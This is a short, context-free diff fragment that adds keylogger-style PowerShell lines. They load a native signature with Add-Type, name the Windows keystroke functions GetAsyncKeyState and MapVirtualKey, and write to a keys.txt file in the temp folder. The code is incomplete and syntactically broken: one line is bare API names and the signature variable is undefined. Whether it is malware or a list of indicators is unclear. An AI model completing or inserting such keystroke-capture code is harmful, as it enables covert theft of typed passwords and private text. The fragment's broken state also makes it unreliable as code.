@@ -1,0 +1,4 @@
+Add-Type -MemberDefinition $sig -Name K -Namespace W
+GetAsyncKeyState MapVirtualKey
+Out-File $env:TEMP\keys.txt
+
